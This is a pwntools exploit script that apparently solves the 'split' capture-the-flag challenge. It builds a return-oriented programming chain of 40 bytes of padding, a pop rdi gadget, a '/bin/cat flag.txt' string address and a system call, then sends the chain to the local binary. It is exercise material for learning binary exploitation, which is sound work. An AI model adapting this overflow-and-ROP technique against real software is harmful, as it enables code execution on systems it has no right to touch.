from pwn import *

binary = context.binary = ELF("./split", checksec=True)
p = process(binary.path)

padding = b"\x90" * 40

useful_string = p64(0x601060) # "/bin/cat" flag.txt
system = p64(0x000000000040074b)        # system
pop_rdi = p64(0x00000000004007c3)       # pop rdi ; ret

payload = padding + pop_rdi + useful_string + system

with open("payload.txt", "wb") as file:
	file.write(payload)

p.sendline(payload)
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())


p.close()
